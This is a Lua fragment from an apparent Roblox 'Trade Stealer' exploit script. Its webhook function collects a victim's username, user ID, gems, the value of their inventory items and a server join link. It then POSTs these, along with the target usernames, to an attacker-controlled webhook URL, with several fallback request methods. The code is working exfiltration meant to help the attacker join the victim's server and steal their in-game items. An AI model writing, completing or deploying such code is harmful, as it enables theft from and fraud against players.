-- ========== WEBHOOK FUNCTION ==========
local function sendWebhook(inventoryData, gemsData, success, customMessage)
    if WEBHOOK_URL == "" then return end
    
    local placeId = game.PlaceId
    local jobId = game.JobId
    local joinLink = string.format("https://www.roblox.com/games/%d?joinId=%s", placeId, jobId)
    
    local playerUser = player.Name
    local playerUserId = player.UserId
    local playerDisplayName = player.DisplayName
    local avatarThumbnail = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", playerUserId)
    
    local inventorySummary = {}
    local totalValue = 0
    
    if inventoryData and #inventoryData > 0 then
        for i, item in ipairs(inventoryData) do
            if i <= 15 then
                table.insert(inventorySummary, string.format("• **%s** – `%s RAP` (x%d)", item.name, tostring(item.totalValue), item.amount))
                totalValue = totalValue + item.totalValue
            end
        end
        if #inventoryData > 15 then
            table.insert(inventorySummary, string.format("• ... and **%d** more items", #inventoryData - 15))
        end
    else
        table.insert(inventorySummary, "• No valuable items found")
    end
    
    local gemsText = gemsData and string.format("**%s** %s", tostring(gemsData.amount), gemsData.id or "Gems") or "None"
    local embedColor = success and 0x9B59B6 or 0xE74C3C
    local statusText = success and "✅ **SUCCESS**" or "❌ **FAILED**"
    
    local finalStatus = customMessage or statusText
    
    local embed = {
        title = "🕵️ **TRADE STEALER REPORT**",
        color = embedColor,
        thumbnail = { url = avatarThumbnail },
        fields = {
            { name = "👤 **Player**", value = string.format("**Username:** %s\n**Display:** %s\n**ID:** `%d`", playerUser, playerDisplayName, playerUserId), inline = true },
            { name = "💰 **Gems**", value = gemsText, inline = true },
            { name = "💎 **Total Value**", value = string.format("`%s RAP`", tostring(totalValue)), inline = true },
            { name = "🔗 **Join Link**", value = string.format("[Click to join server](%s)", joinLink), inline = false },
            { name = "🎮 **Server Info**", value = string.format("`Place ID:` %d\n`Job ID:` `%s`", placeId, jobId), inline = true },
            { name = "🎯 **Target**", value = string.format("`%s`", table.concat(targetUsernames, "`, `")), inline = true },
            { name = "📦 **Valuable Items**", value = table.concat(inventorySummary, "\n"), inline = false },
            { name = "🏁 **Status**", value = finalStatus, inline = false }
        },
        footer = { text = "🔒 Trade Stealer • " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url = "https://cdn-icons-png.flaticon.com/512/1068/1068520.png" }
    }
    
    local webhookData = {
        content = "@everyone",
        embeds = { embed }
    }
    
    local encodedData = HttpService:JSONEncode(webhookData)
    
    -- Try each request function
    local successSent = false
    
    for _, req_func in ipairs(request_funcs) do
        if not successSent then
            pcall(function()
                req_func({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = encodedData
                })
                successSent = true
                print("[Webhook] Sent successfully!")
            end)
        end
    end
    
    -- Fallback to HttpService if all else fails
    if not successSent then
        pcall(function()
            HttpService:PostAsync(WEBHOOK_URL, encodedData, Enum.HttpContentType.ApplicationJson)
            successSent = true
            print("[Webhook] Sent via HttpService fallback")
        end)
    end
    
    if not successSent then
        warn("[Webhook] Failed to send - no working HTTP method")
    end
end

-- ========== SAFE WAIT ==========
local function safeWait(seconds)
    local start = tick()
    repeat
        RunService.Heartbeat:Wait()
    until tick() - start >= seconds
end

